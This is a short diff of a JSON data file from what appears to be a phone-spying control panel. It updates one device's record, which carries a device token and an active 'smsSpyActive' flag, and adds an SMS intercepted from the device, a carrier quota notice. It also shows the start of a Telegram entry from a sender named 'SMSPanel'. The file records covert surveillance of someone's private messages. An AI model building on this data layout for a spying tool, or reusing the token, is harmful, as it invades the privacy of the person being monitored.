@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775629781105,
+    "lastSeen": 1775629799282,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Messages",
+        "sender": "XL",
+        "content": "(XL) Kuota Area Bebas Puas kamu saat ini kurang dari 196.00MB. Cek kuota berkala di aplikasi myXL atau *808#. Info: xl.co.id/LC",
+        "time": "08/04 13:30",
+        "pkg": "com.google.android.apps.messaging",
+        "receivedAt": 1775629801258
+      },
       {
         "appName": "Telegram",
         "sender": "𝐒𝐌𝐒𝐏𝐚𝐧𝐞𝐥",
